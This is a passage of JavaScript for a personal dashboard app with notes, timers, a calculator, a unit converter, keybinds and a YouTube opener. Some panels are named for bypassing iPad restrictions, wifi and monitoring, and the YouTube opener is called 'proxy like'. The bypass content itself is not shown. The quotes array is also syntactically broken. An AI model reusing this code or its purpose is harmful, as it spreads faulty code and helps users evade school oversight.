                    this.logActivity(`Added text "${text}" to canvas.`, 'Notes');
                    customAlert('Text added to canvas!', '✍️');
                    textToAddToCanvas.value = ''; // Clear input
                }
            });


            getEl('exportNotesBtn').addEventListener('click', () => {
                const link = document.createElement('a');
                link.download = `notes_canvas_${new Date().getTime()}.png`;
                link.href = canvas.toDataURL('image/png');
                link.click();
                this.logActivity('Notes canvas exported as PNG.', 'File');
            });

            this.logActivity('Notes canvas initialized.', 'System');
        },

        initInfoPanels: function() {
            // All info panels are hidden by default via CSS. Their display is managed by togglePanel.
            // Reset contents for dynamic parts.
            getEl('ipadRestrictions').style.display = 'none';
            getEl('ipadBypasses').style.display = 'none';
            getEl('bathroomBypass').style.display = 'none';
            getEl('wifiBypass').style.display = 'none';
            getEl('monitoringBypass').style.display = 'none';
            getEl('coming1Bypass').style.display = 'none';
            getEl('coming2Bypass').style.display = 'none';
            getEl('coming3Bypass').style.display = 'none';
            this.logActivity('Information panels initialized (hidden by default).', 'System');
        },

        togglePanel: function(panelId) {
            const panel = getEl(panelId);
            if (!panel) return;

            const isOpen = panel.style.display === 'block';

            // Close all other panels if opening a new one, but only info-panels or large canvas container
            document.querySelectorAll('.info-panel.box').forEach(p => {
                if (p.id !== panelId) {
                    p.style.display = 'none';
                }
            });

            panel.style.display = isOpen ? 'none' : 'block';
            this.logActivity(`Panel '${panelId}' ${isOpen ? 'closed' : 'opened'}.`, 'UI');
            if (!isOpen) {
                this.updateStat('panelsOpened');
                // Bring the opened panel to the front if using custom layout
                const container = getEl('dashboardLayoutContainer');
                if (container) {
                    container.querySelectorAll('.box, .info-panel').forEach(p => {
                        if (p.id === panelId) {
                            p.style.zIndex = '2';
                        } else {
                            p.style.zIndex = '1'; // Others revert to normal z-index
                        }
                    });
                }
            }
        },

        showIpadContent: function(contentId) {
            document.querySelectorAll('.ipad-content').forEach(content => {
                content.style.display = 'none';
            });
            getEl('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
            this.logActivity(`iPad content section '${contentId}' shown.`, 'UI');
        },

        showBypassContent: function(contentId) {
            document.querySelectorAll('.bypass-content').forEach(content => {
                content.style.display = 'none';
            });
            getEl(contentId + 'Bypass').style.display = 'block';
            this.logActivity(`Bypass content section '${contentId}' shown.`, 'UI');
        },

        motivationQuotes: [
            "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill,
            "The only way to do great work is to love what you do." – Steve Jobs,
            "Believe you can and you're halfway there." – Theodore Roosevelt,
            "The future belongs to those who believe in the beauty of their dreams." – Eleanor Roosevelt,
            "It does not matter how slowly you go as long as you do not stop." – Confucius,
            "Strive not to be a success, but rather to be of value." – Albert Einstein
        ],
        randomFacts: [
            "A group of owls is called a parliament.",
            "Honey never spoils.",
            "The shortest war in history was between Britain and Zanzibar on August 27, 1896. Zanzibar surrendered after 38 minutes.",
            "There are more possible iterations of a game of chess than there are atoms in the known universe.",
            "Octopuses have three hearts.",
            "The average person walks the equivalent of three times around the world in their lifetime.",
            "It is impossible for most people to lick their own elbow.",
            "A 'jiffy' is an actual unit of time: 1/100th of a second."
        ],
        currentMotivationIndex: 0,
        currentFactIndex: 0,
        currentQuoteIndex: 0,

        initMotivationFactsQuotes: function() {
            // Initial load
            getEl('motivationBox').innerHTML = `<p>${this.motivationQuotes[0]}</p>`;
            getEl('currentFact').innerHTML = `<p>${this.randomFacts[0]}</p>`;
            getEl('currentQuote').innerHTML = `<p>${this.motivationQuotes[0]}</p>`; // Reusing motivation quotes for daily quotes

            // Next Fact button
            const nextFactBtn = getEl('nextFactBtn');
            if (nextFactBtn) {
                nextFactBtn.addEventListener('click', () => {
                    this.currentFactIndex = (this.currentFactIndex + 1) % this.randomFacts.length;
                    getEl('currentFact').textContent = this.randomFacts[this.currentFactIndex];
                    this.logActivity('Next random fact loaded.', 'Content');
                });
            }

            // Next Quote button
            const nextQuoteBtn = getEl('nextQuoteBtn');
            if (nextQuoteBtn) {
                nextQuoteBtn.addEventListener('click', () => {
                    this.currentQuoteIndex = (this.currentQuoteIndex + 1) % this.motivationQuotes.length;
                    getEl('currentQuote').textContent = this.motivationQuotes[this.currentQuoteIndex];
                    this.logActivity('Next daily quote loaded.', 'Content');
                });
            }
            this.logActivity('Motivation, facts, and quotes panels initialized.', 'System');
        },

        // New dashboard search bar
        initSearchBar: function() {
            const searchBar = getEl('dashboardSearchBar');
            if (!searchBar) return;

            searchBar.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const query = searchBar.value.toLowerCase().trim();
                    this.searchAndHighlightPanel(query);
                    this.logActivity(`Searched for: "${query}"`, 'Search');
                }
            });
        },

        searchAndHighlightPanel: function(query) {
            let foundPanel = null;
            let scrollToPanel = null;
            // Iterate over all known panel IDs to find a match
            for (const panelId in panelNames) {
                const name = panelNames[panelId].toLowerCase();
                if (name.includes(query)) {
                    foundPanel = getEl(panelId);
                    scrollToPanel = foundPanel; // Prioritize opening
                    break;
                }
            }

            // Also search text content of currently visible panels
            if (!foundPanel) {
                document.querySelectorAll('.box, .info-panel').forEach(panel => {
                    if (panel.style.display !== 'none' && panel.textContent.toLowerCase().includes(query)) {
                        foundPanel = panel; // Highlight text matches
                        if (!scrollToPanel) scrollToPanel = panel; // Set scroll target if not already found by name
                    }
                });
            }


            if (scrollToPanel) {
                this.logActivity(`Found and highlighting panel for: "${query}"`, 'Search');
                // Ensure the panel is visible before highlighting
                if (scrollToPanel.classList.contains('info-panel') || scrollToPanel.id === 'canvasContainer' || scrollToPanel.id === 'settingsPanel' || scrollToPanel.id === 'keybindsPanel') {
                    scrollToPanel.style.display = 'block'; // Make it visible if it's a dynamic panel
                    this.updateStat('panelsOpened');
                }
                scrollToPanel.scrollIntoView({ behavior: 'smooth', block: 'center' });
                scrollToPanel.classList.add('highlight'); // Add animation class
                setTimeout(() => {
                    scrollToPanel.classList.remove('highlight');
                }, 2500); // Remove highlight after animation
                customAlert(`Navigated to: ${panelNames[scrollToPanel.id] || scrollToPanel.id}`, '🔎');
            } else {
                customAlert('No matching dashboard section found!', '⚠️');
                this.logActivity(`No match found for search: "${query}"`, 'Search');
            }
        },

        initKeybinds: function() {
            this.loadKeybinds();
            this.updateKeybindsDisplay();

            const keybindInput = getEl('keybindInput');
            const keybindAddBtn = getEl('keybindAddBtn');
            const keybindAction = getEl('keybindAction');
            let currentKeybind = '';

            keybindInput.addEventListener('keydown', (e) => {
                e.preventDefault();
                // Ensure consistent key representation
                const keys = [];
                if (e.altKey) keys.push('Alt');
                if (e.ctrlKey) keys.push('Ctrl');
                if (e.shiftKey) keys.push('Shift');
                if (e.metaKey) keys.push('Meta'); // Command key on Mac

                if (!['Alt', 'Control', 'Shift', 'Meta'].includes(e.key)) {
                    keys.push(e.key);
                }
                currentKeybind = keys.join('+');
                keybindInput.value = currentKeybind;
            });

            keybindAddBtn.addEventListener('click', () => {
                if (currentKeybind && keybindAction.value) {
                    keybinds[currentKeybind] = keybindAction.value;
                    localStorage.setItem('keybinds', JSON.stringify(keybinds));
                    this.updateKeybindsDisplay();
                    keybindInput.value = '';
                    keybindAction.value = '';
                    currentKeybind = '';
                    customAlert(`Keybind added: ${currentKeybind} -> ${keybindAction.value}`, '✅');
                    this.logActivity(`Keybind added: ${currentKeybind} -> ${keybindAction.value}`, 'Keybind');
                } else {
                    customAlert('Please specify both a key combination and an action!', '⚠️');
                }
            });

            document.addEventListener('keydown', (e) => {
                const pressedKeys = [];
                if (e.altKey) pressedKeys.push('Alt');
                if (e.ctrlKey) pressedKeys.push('Ctrl');
                if (e.shiftKey) pressedKeys.push('Shift');
                if (e.metaKey) pressedKeys.push('Meta');
                if (!['Alt', 'Control', 'Shift', 'Meta'].includes(e.key)) {
                    pressedKeys.push(e.key);
                }
                const executedKeybind = pressedKeys.join('+');
                const action = keybinds[executedKeybind];

                if (action) {
                    e.preventDefault(); // Prevent default browser action if keybind is matched
                    this.triggerKeybindAction(action);
                    this.logActivity(`Keybind triggered: ${executedKeybind} -> ${action}`, 'Keybind');
                }
            });
            this.logActivity('Keybinds system initialized.', 'System');
        },

        loadKeybinds: function() {
            keybinds = JSON.parse(localStorage.getItem('keybinds') || '{}');
        },

        updateKeybindsDisplay: function() {
            const list = getEl('activeKeybindsList');
            if (list) {
                if (Object.keys(keybinds).length === 0) {
                    list.innerHTML = '<p>No keybinds configured yet.</p>';
                    return;
                }
                list.innerHTML = Object.entries(keybinds).map(([key, action]) =>
                    `<div class="keybind-item"><span><strong>${key}</strong>: ${action}</span><button data-key="${key}" class="remove-keybind-btn" style="background:red; color:white; padding: 5px 10px; border-radius:4px;">Remove</button></div>`
                ).join('');

                list.querySelectorAll('.remove-keybind-btn').forEach(button => {
                    button.addEventListener('click', (e) => {
                        const keyToRemove = e.target.dataset.key;
                        if (confirm(`Are you sure you want to remove the keybind for ${keyToRemove}?`)) {
                            delete keybinds[keyToRemove];
                            localStorage.setItem('keybinds', JSON.stringify(keybinds));
                            this.updateKeybindsDisplay();
                            customAlert(`Keybind removed: ${keyToRemove}`, '🗑️');
                            this.logActivity(`Keybind removed: ${keyToRemove}`, 'Keybind');
                        }
                    });
                });
            }
        },

        triggerKeybindAction: function(actionString) {
            // Example action parsing
            if (actionString.startsWith('togglePanel:')) {
                const panelId = actionString.split(':')[1];
                this.togglePanel(panelId);
            } else if (actionString.startsWith('showCustomAlert:')) {
                const message = actionString.split(':')[1];
                customAlert(message, '📢');
            } else if (actionString.startsWith('triggerAction:')) {
                 const elementId = actionString.split(':')[1];
                 const button = getEl(elementId);
                 if (button && typeof button.click === 'function') {
                    button.click(); // Programmatically click the button
                 }
            }
            // Add more action types as needed
        },

        // Timer, Stopwatch, Reminder Tool
        stopwatch: {
            interval: null,
            startTime: 0,
            elapsedTime: 0,
            isRunning: false,
            display: getEl('stopwatchDisplay'),

            start: function() {
                if (!this.isRunning) {
                    this.startTime = Date.now() - this.elapsedTime;
                    this.interval = setInterval(() => {
                        this.elapsedTime = Date.now() - this.startTime;
                        this.updateDisplay();
                    }, 1000);
                    this.isRunning = true;
                    dashboard.logActivity('Stopwatch started.', 'Timer');
                }
            },
            pause: function() {
                clearInterval(this.interval);
                this.isRunning = false;
                dashboard.logActivity('Stopwatch paused.', 'Timer');
            },
            reset: function() {
                clearInterval(this.interval);
                this.isRunning = false;
                this.elapsedTime = 0;
                this.updateDisplay();
                dashboard.logActivity('Stopwatch reset.', 'Timer');
            },
            updateDisplay: function() {
                const totalSeconds = Math.floor(this.elapsedTime / 1000);
                const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
                const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
                const secs = String(totalSeconds % 60).padStart(2, '0');
                if (this.display) this.display.textContent = `${hrs}:${mins}:${secs}`;
            }
        },

        timer: {
            interval: null,
            totalSeconds: 0,
            secondsLeft: 0,
            isRunning: false,
            display: getEl('timerDisplay'),
            minutesInput: getEl('timerMinutesInput'),
            secondsInput: getEl('timerSecondsInput'),

            init: function() {
                this.updateDisplay(); // Set initial display
                getEl('timerStartBtn').addEventListener('click', () => this.start());
                getEl('timerPauseBtn').addEventListener('click', () => this.pause());
                getEl('timerResetBtn').addEventListener('click', () => this.reset());
            },
            start: function() {
                if (this.totalSeconds === 0) {
                    this.totalSeconds = (parseInt(this.minutesInput.value || 0) * 60) + parseInt(this.secondsInput.value || 0);
                    this.secondsLeft = this.totalSeconds;
                }
                if (this.secondsLeft <= 0) {
                    customAlert('Timer cannot start from zero!', '❌');
                    return;
                }

                if (!this.isRunning) {
                    this.interval = setInterval(() => {
                        this.secondsLeft--;
                        this.updateDisplay();
                        if (this.secondsLeft <= 0) {
                            clearInterval(this.interval);
                            this.isRunning = false;
                            customAlert('Timer finished!', '🔔'); // Alert without sound
                            dashboard.logActivity('Countdown timer finished.', 'Timer');
                        }
                    }, 1000);
                    this.isRunning = true;
                    dashboard.logActivity(`Countdown timer started for ${this.minutesInput.value}m ${this.secondsInput.value}s.`, 'Timer');
                }
            },
            pause: function() {
                clearInterval(this.interval);
                this.isRunning = false;
                dashboard.logActivity('Countdown timer paused.', 'Timer');
            },
            reset: function() {
                clearInterval(this.interval);
                this.isRunning = false;
                this.secondsLeft = 0;
                this.totalSeconds = 0;
                this.minutesInput.value = 0;
                this.secondsInput.value = 0;
                this.updateDisplay();
                dashboard.logActivity('Countdown timer reset.', 'Timer');
            },
            updateDisplay: function() {
                const mins = String(Math.floor(this.secondsLeft / 60)).padStart(2, '0');
                const secs = String(this.secondsLeft % 60).padStart(2, '0');
                if (this.display) this.display.textContent = `${mins}:${secs}`;
            }
        },

        reminderManager: {
            setReminderBtn: getEl('setReminderBtn'),
            reminderMessageInput: getEl('reminderMessage'),
            reminderTimeInput: getEl('reminderTime'),
            reminders: [],

            init: function() {
                this.setReminderBtn.addEventListener('click', () => this.setReminder());
                setInterval(() => this.checkReminders(), 1000); // Check every second
            },
            setReminder: function() {
                const message = this.reminderMessageInput.value.trim();
                const timeStr = this.reminderTimeInput.value;

                if (!message || !timeStr) {
                    customAlert('Please enter both a reminder message and a time!', '⚠️');
                    return;
                }

                const reminderTime = new Date(timeStr).getTime();
                if (isNaN(reminderTime) || reminderTime <= Date.now()) {
                    customAlert('Please select a valid future date and time!', '❌');
                    return;
                }

                this.reminders.push({ message, time: reminderTime, setAt: new Date().toLocaleString() });
                this.reminderMessageInput.value = '';
                this.reminderTimeInput.value = '';
                customAlert(`Reminder "${message}" set for ${new Date(reminderTime).toLocaleString()}.`, '✅');
                dashboard.logActivity(`Reminder set: "${message}" for ${new Date(reminderTime).toLocaleString()}.`, 'Reminder');
                dashboard.updateStat('remindersSet');
            },
            checkReminders: function() {
                const now = Date.now();
                this.reminders.forEach((reminder, index) => {
                    if (now >= reminder.time) {
                        customAlert(`⏰ Reminder: ${reminder.message}`, '🔔');
                        dashboard.logActivity(`Reminder triggered: "${reminder.message}"`, 'Reminder');
                        this.reminders.splice(index, 1); // Remove reminder once triggered
                    }
                });
            }
        },


        // Calculator functionality
        calculator: {
            display: getEl('calculatorDisplay'),
            currentInput: '0',
            operator: null,
            previousInput: null,
            resetDisplay: false,

            init: function() {
                const buttons = document.querySelectorAll('#calculatorPanel button');
                buttons.forEach(button => {
                    button.addEventListener('click', () => this.handleButtonClick(button.textContent));
                });
                this.updateDisplay();
            },

            handleButtonClick: function(value) {
                dashboard.logActivity(`Calculator button clicked: ${value}`, 'Calculator');
                if (value >= '0' && value <= '9') {
                    if (this.resetDisplay || this.currentInput === '0') {
                        this.currentInput = value;
                        this.resetDisplay = false;
                    } else {
                        this.currentInput += value;
                    }
                } else if (value === '.') {
                    if (this.resetDisplay) {
                        this.currentInput = '0.';
                        this.resetDisplay = false;
                    } else if (!this.currentInput.includes('.')) {
                        this.currentInput += '.';
                    }
                } else if (['+', '-', '*', '/', '%'].includes(value)) {
                    if (this.operator && !this.resetDisplay) {
                        this.calculate();
                    }
                    this.operator = value;
                    this.previousInput = this.currentInput;
                    this.resetDisplay = true;
                } else if (value === '=') {
                    if (this.operator && this.previousInput !== null) {
                        this.calculate();
                        this.operator = null;
                        this.previousInput = null;
                        this.resetDisplay = true; // Prepare for new calculation
                    }
                } else if (value === 'C') {
                    this.currentInput = '0';
                    this.operator = null;
                    this.previousInput = null;
                    this.resetDisplay = false;
                } else if (value === '+/-') {
                    this.currentInput = (parseFloat(this.currentInput) * -1).toString();
                }
                this.updateDisplay();
            },

            calculate: function() {
                let result;
                const prev = parseFloat(this.previousInput);
                const current = parseFloat(this.currentInput);

                if (isNaN(prev) || isNaN(current)) return;

                switch (this.operator) {
                    case '+': result = prev + current; break;
                    case '-': result = prev - current; break;
                    case '*': result = prev * current; break;
                    case '/': result = prev / current; break;
                    case '%': result = prev % current; break;
                    default: return;
                }
                this.currentInput = result.toString();
            },

            updateDisplay: function() {
                if (this.display) this.display.textContent = this.currentInput;
            }
        },

        // Unit Converter
        unitConverter: {
            convertFromValueInput: getEl('convertFromValue'),
            convertFromUnitSelect: getEl('convertFromUnit'),
            convertToUnitSelect: getEl('convertToUnit'),
            conversionResultP: getEl('conversionResult'),
            performConversionBtn: getEl('performConversionBtn'),

            units: {
                length: {
                    'meters': 1, 'kilometers': 1000, 'centimeters': 0.01, 'millimeters': 0.001,
                    'miles': 1609.34, 'yards': 0.9144, 'feet': 0.3048, 'inches': 0.0254
                },
                weight: {
                    'grams': 1, 'kilograms': 1000, 'milligrams': 0.001, 'pounds': 453.592,
                    'ounces': 28.3495, 'stones': 6350.29
                },
                temperature: { // Special handling needed
                    'celsius': {'toF': (c) => (c * 9/5) + 32, 'fromF': (f) => (f - 32) * 5/9, 'toK': (c) => c + 273.15, 'fromK': (k) => k - 273.15 },
                    'fahrenheit': {'toC': (f) => (f - 32) * 5/9, 'fromC': (c) => (c * 9/5) + 32, 'toK': (f) => (f - 32) * 5/9 + 273.15, 'fromK': (k) => (k - 273.15) * 9/5 + 32 },
                    'kelvin': {'toC': (k) => k - 273.15, 'fromC': (c) => c + 273.15, 'toF': (k) => (k - 273.15) * 9/5 + 32, 'fromF': (f) => (f - 32) * 5/9 + 273.15}
                },
                volume: {
                    'liters': 1, 'milliliters': 0.001, 'gallons': 3.78541, 'quarts': 0.946353, 'pints': 0.473176,
                    'cups': 0.236588, 'fluid ounces': 0.0295735
                },
                time: {
                    'seconds': 1, 'minutes': 60, 'hours': 3600, 'days': 86400, 'weeks': 604800
                }
            },
            currentCategory: 'length',

            init: function() {
                this.populateUnitSelects();
                this.performConversionBtn.addEventListener('click', () => this.convert());
                this.convertFromUnitSelect.addEventListener('change', () => this.onFromUnitChange());
            },

            populateUnitSelects: function() {
                let html = '';
                for (const category in this.units) {
                    html += `<optgroup label="${category.charAt(0).toUpperCase() + category.slice(1)}">`;
                    for (const unit in this.units[category]) {
                        html += `<option value="${category}:${unit}">${unit}</option>`;
                    }
                    html += `</optgroup>`;
                }
                this.convertFromUnitSelect.innerHTML = html;
                this.convertToUnitSelect.innerHTML = html;

                // Set initial default options
                this.convertFromUnitSelect.value = 'length:meters';
                this.convertToUnitSelect.value = 'length:kilometers';
            },

            onFromUnitChange: function() {
                const selected = this.convertFromUnitSelect.value.split(':');
                this.currentCategory = selected[0];

                // Filter toUnits options to only show the current category
                this.convertToUnitSelect.innerHTML = ''; // Clear previous options
                const html = `<optgroup label="${this.currentCategory.charAt(0).toUpperCase() + this.currentCategory.slice(1)}">` +
                             Object.keys(this.units[this.currentCategory]).map(unit => `<option value="${this.currentCategory}:${unit}">${unit}</option>`).join('') +
                             `</optgroup>`;
                this.convertToUnitSelect.innerHTML = html;

                // Try to set a sensible default, or just pick the first one
                if (this.convertToUnitSelect.querySelector(`option[value="${selected[0]}:kilometers"]`)) {
                    this.convertToUnitSelect.value = `${selected[0]}:kilometers`;
                } else if (this.convertToUnitSelect.querySelector(`option[value="${selected[0]}:grams"]`)) {
                    this.convertToUnitSelect.value = `${selected[0]}:grams`;
                } else if (this.convertToUnitSelect.querySelector(`option[value="${selected[0]}:celsius"]`)) {
                    this.convertToUnitSelect.value = `${selected[0]}:celsius`;
                } else if (this.convertToUnitSelect.querySelector(`option[value="${selected[0]}:liters"]`)) {
                    this.convertToUnitSelect.value = `${selected[0]}:liters`;
                } else if (this.convertToUnitSelect.querySelector(`option[value="${selected[0]}:seconds"]`)) {
                    this.convertToUnitSelect.value = `${selected[0]}:seconds`;
                } else {
                    this.convertToUnitSelect.selectedIndex = 0; // Fallback to first
                }
                this.convert(); // Auto-convert when units change
            },

            convert: function() {
                const value = parseFloat(this.convertFromValueInput.value);
                const fromUnitFull = this.convertFromUnitSelect.value.split(':');
                const toUnitFull = this.convertToUnitSelect.value.split(':');

                if (isNaN(value) || !fromUnitFull[0] || !toUnitFull[0]) {
                    this.conversionResultP.textContent = 'Invalid Input';
                    return;
                }

                const fromCategory = fromUnitFull[0];
                const fromUnit = fromUnitFull[1];
                const toCategory = toUnitFull[0];
                const toUnit = toUnitFull[1];

                if (fromCategory !== toCategory) {
                    this.conversionResultP.textContent = 'Cannot convert between different categories!';
                    customAlert('Cannot convert between different categories (e.g., length to weight)!', '❌');
                    return;
                }

                let result;
                if (fromCategory === 'temperature') {
                    if (fromUnit === toUnit) {
                        result = value;
                    } else if (fromUnit === 'celsius') {
                        if (toUnit === 'fahrenheit') result = this.units.temperature.celsius.toF(value);
                        else if (toUnit === 'kelvin') result = this.units.temperature.celsius.toK(value);
                    } else if (fromUnit === 'fahrenheit') {
                        if (toUnit === 'celsius') result = this.units.temperature.fahrenheit.toC(value);
                        else if (toUnit === 'kelvin') result = this.units.temperature.fahrenheit.toK(value);
                    } else if (fromUnit === 'kelvin') {
                        if (toUnit === 'celsius') result = this.units.temperature.kelvin.toC(value);
                        else if (toUnit === 'fahrenheit') result = this.units.temperature.kelvin.toF(value);
                    }
                } else {
                    // Convert to base unit, then from base unit to target unit
                    const baseValue = value * this.units[fromCategory][fromUnit];
                    result = baseValue / this.units[toCategory][toUnit];
                }

                if (result !== undefined) {
                    this.conversionResultP.textContent = result.toFixed(4) + ' ' + toUnit;
                } else {
                    this.conversionResultP.textContent = 'Conversion Error';
                }
                dashboard.logActivity(`Converted ${value} ${fromUnit} to ${this.conversionResultP.textContent}.`, 'Converter');
            }
        },

        initMediaPlayer: function() {
            const youtubeLinkInput = getEl('youtubeLinkInput');
            const loadYoutubeVideoBtn = getEl('loadYoutubeVideoBtn');
            const currentPlayingVideoLink = getEl('currentPlayingVideoLink');

            loadYoutubeVideoBtn.addEventListener('click', () => {
                const link = youtubeLinkInput.value.trim();
                let videoId = '';

                if (link.includes('youtu.be/')) {
                    videoId = link.split('youtu.be/')[1];
                } else if (link.includes('youtube.com/watch?v=')) {
                    videoId = link.split('v=')[1];
                    const ampersandPosition = videoId.indexOf('&');
                    if (ampersandPosition !== -1) {
                        videoId = videoId.substring(0, ampersandPosition);
                    }
                }

                if (videoId) {
                    const embedUrl = `https://www.youtube.com/embed/${videoId}`;
                    currentPlayingVideoLink.href = embedUrl; // Direct embed for proxy like functionality
                    currentPlayingVideoLink.textContent = 'Click here to play video in new tab';
                    currentPlayingVideoLink.style.display = 'block';
                    window.open(embedUrl, '_blank'); // Open in new tab, browser typically allows this from user interaction

                    youtubeLinkInput.value = ''; // Clear input
                    customAlert('Video link opened in new tab!', '▶️');
                    this.logActivity(`YouTube video loaded: ${link}`, 'Media');
                } else {
                    customAlert('Please enter a valid YouTube link!', '❌');
                }
            });
            this.logActivity('Media player initialized.', 'System');
        },


        showWelcomeNotification: function() {
            const showWelcome = JSON.parse(localStorage.getItem('setting_showWelcomeNotification') || 'true');
            if (!showWelcome) {
                return;
            }

            const welcomeNotification = getEl('welcomeNotification');
            if (welcomeNotification && currentLoggedInUser) {
                welcomeNotification.textContent = `Welcome ${currentLoggedInUser.name || currentLoggedInUser.username}!`;
                welcomeNotification.classList.add('show');
                setTimeout(() => {
                    welcomeNotification.classList.remove('show');
                }, 4000); // Display for 4 seconds
            }
        },

        // New Settings Panel functions
        initSettingsPanel: function() {
            const settingsPanel = getEl('settingsPanel');
            if (!settingsPanel) return;

            // Load saved settings (or defaults)
            settingsPanel.querySelectorAll('input[type="range"], input[type="checkbox"], select').forEach(control => {
                const settingKey = `setting_${control.id}`;
                const savedValue = localStorage.getItem(settingKey);
                if (savedValue !== null) {
                    if (control.type === 'checkbox') {
                        control.checked = JSON.parse(savedValue);
                    } else if (control.tagName === 'SELECT' || control.type === 'range') {
                        control.value = savedValue;
                    }
                }
                // Apply immediately
                this.applySetting(control.id, control.value || control.checked);


                // Add event listeners for saving
                control.addEventListener('change', (event) => {
                    let valueToSave;
                    if (event.target.type === 'checkbox') {
                        valueToSave = event.target.checked;
                    } else {
                        valueToSave = event.target.value;
                    }
                    localStorage.setItem(settingKey, JSON.stringify(valueToSave));
                    this.logActivity(`Setting changed: ${settingKey} to ${valueToSave}`, 'Setting');
                    this.updateStat('togglesFlipped'); // Consider all settings changes as toggles

                    this.applySetting(event.target.id, valueToSave); // Apply logic
                });
            });

            // Specific button listeners
            getEl('resetPanelLayout').addEventListener('click', () => {
                if (confirm('Are you sure you want to reset all dashboard panel positions and sizes?')) {
                    localStorage.removeItem('panelPositions');
                    panelPositions = {}; // Clear in memory
                    customAlert('Dashboard layout reset to default!', '↩️');
                    this.logActivity('Dashboard panel layout reset.', 'UI');
                    window.location.reload(); // Simple refresh to apply defaults
                }
            });

            getEl('clearLocalCacheBtn').addEventListener('click', () => {
                if (confirm('Are you sure you want to clear local cache? This will reset all local dashboard data including saved themes, keybinds, notes, activity logs etc. (excluding user login info).')) {
                    localStorage.clear(); // Clears everything for this domain
                    customAlert('Local cache cleared! Page will reload.', '🗑️');
                    this.logActivity('Local storage cleared.', 'System');
                    window.location.reload();
                }
            });

            // Example actions for placeholder settings
            getEl('updateProfilePictureBtn').addEventListener('click', () => customAlert('Profile picture upload feature coming soon!', '🖼️'));
            getEl('privacyPolicyBtn').addEventListener('click', () => customAlert('View privacy policy in a new tab!', '📄'));
            getEl('termsOfServiceBtn').addEventListener('click', () => customAlert('View terms of service in a new tab!', '📄'));

            this.logActivity('Settings panel initialized.', 'System');
        },

        applySetting: function(settingId, value) {
            switch(settingId) {
                case 'darkModeByDefault':
                    // This setting primarily affects login page, so apply on body for current view
                    if (getEl('bodyElement').classList.contains('login-body')) {
                        getEl('bodyElement').classList.toggle('light-theme', !value);
                    }
                    break;
                case 'showAnnouncementBar':
                    getEl('announcementBar').style.display = value ? 'block' : 'none';
                    break;
                case 'dashboardLayout':
                    // Refresh behavior when layout type changes (e.g. from default to custom)
                    // For now, relies on the full init for draggable.
                    this.applyPanelVisibilityAndDrag(); // Re-apply UI/UX
                    break;
                case 'uiAnimationSpeed':
                    // Example: Update a global CSS variable if exists
                    document.documentElement.style.setProperty('--ui-animation-speed', `${value}s`);
                    break;
                case 'notificationVolume':
                    // Handled implicitly by the alert system's design (no sound).
                    break;
                case 'showWelcomeNotification':
                    // Logic to show/hide at login
                    break;
                // Add more cases for each setting as their logic is implemented
            }
        },


        initPanelInteractivity: function() {
            // Apply Draggable and Resizable to all known panels if custom layout is enabled
            const dashboardLayout = localStorage.getItem('setting_dashboardLayout') || 'default';
            if (dashboardLayout === 'custom') {
                document.querySelectorAll('.box, .info-panel').forEach(panel => {
                    const $panel = $(panel);
                    // Enable jQuery UI Draggable
                    $panel.draggable({
                        handle: "h2", // Only drag by the header
                        containment: "#dashboardLayoutContainer",
                        stop: (event, ui) => {
                            this.savePanelPosition(panel.id, ui.position.left, ui.position.top, $panel.width(), $panel.height());
                            panel.style.zIndex = '1'; // Reset z-index after dragging
                            this.logActivity(`Panel '${panel.id}' dragged to X:${ui.position.left}, Y:${ui.position.top}.`, 'UI');
                        },
                        start: (event, ui) => {
                            // Bring to front on drag start
                            $(event.target).css('z-index', '3');
                        }
                    });

                    // Enable jQuery UI Resizable
                    $panel.resizable({
                        containment: "#dashboardLayoutContainer",
                        minHeight: 120,
                        minWidth: 200,
                        stop: (event, ui) => {
                            this.savePanelPosition(panel.id, ui.position.left, ui.position.top, ui.size.width, ui.size.height);
                            panel.style.zIndex = '1'; // Reset z-index after resizing
                            this.logActivity(`Panel '${panel.id}' resized to W:${ui.size.width}, H:${ui.size.height}.`, 'UI');
                        },
                         start: (event, ui) => {
                            // Bring to front on resize start
                            $(event.target).css('z-index', '3');
                        }
                    });

                     // Reset z-index on click for easier focus, without affecting drag/resize
                    panel.addEventListener('mousedown', () => {
                        const container = getEl('dashboardLayoutContainer');
                        if (container) {
                            container.querySelectorAll('.box, .info-panel').forEach(p => {
                                if (p === panel) {
                                    p.style.zIndex = '2'; // Bring current panel to front on click
                                } else if (parseInt(p.style.zIndex || '1') > 0) { // Keep higher if being dragged/resized
                                    p.style.zIndex = '1'; // Others revert to normal z-index
                                }
                            });
                        }
                    });
                });
            } else {
                // If not custom layout, remove draggable/resizable and revert to default positions
                document.querySelectorAll('.box, .info-panel').forEach(panel => {
                    const $panel = $(panel);
                    if ($panel.hasClass('ui-draggable')) $panel.draggable('destroy');
                    if ($panel.hasClass('ui-resizable')) $panel.resizable('destroy');
                    panel.style.position = 'relative'; // Default to normal flow (flex/grid managed by CSS)
                    panel.style.left = '';
                    panel.style.top = '';
                    panel.style.width = '';
                    panel.style.height = '';
                    panel.style.zIndex = '';
                });
                this.applyDefaultGridLayout(); // Apply CSS for grid layout
            }
        },

        savePanelPosition: function(id, left, top, width, height) {
            panelPositions[id] = { left, top, width, height };
            localStorage.setItem('panelPositions', JSON.stringify(panelPositions));
        },

        loadPanelPositions: function() {
            panelPositions = JSON.parse(localStorage.getItem('panelPositions') || '{}');
            const dashboardLayout = localStorage.getItem('setting_dashboardLayout') || 'default';

            if (dashboardLayout === 'custom') {
                document.querySelectorAll('.box, .info-panel').forEach(panel => {
                    if (panelPositions[panel.id]) {
                        const pos = panelPositions[panel.id];
                        panel.style.position = 'absolute'; // Ensure absolute positioning
                        panel.style.left = `${pos.left}px`;
                        panel.style.top = `${pos.top}px`;
                        panel.style.width = `${pos.width}px`;
                        panel.style.height = `${pos.height}px`;
                        panel.style.zIndex = '1'; // Default z-index for loaded panels
                    } else {
                        // Apply default if not found in storage, but keep it in flow for relative positioning to work
                        panel.style.position = 'absolute'; // Keep panels initially absolute
                        // Use CSS for default positions where defined, else fallback.
                        // For demonstration, will place new panels slightly offset
                    }
                });
            } else {
                // Remove any custom positioning from CSS in custom layout
                document.querySelectorAll('.box, .info-panel').forEach(panel => {
                    panel.style.position = '';
                    panel.style.left = '';
                    panel.style.top = '';
                    panel.style.width = '';
                    panel.style.height = '';
                });
                this.applyDefaultGridLayout();
            }
             this.logActivity('Panel positions loaded.', 'System');
        },

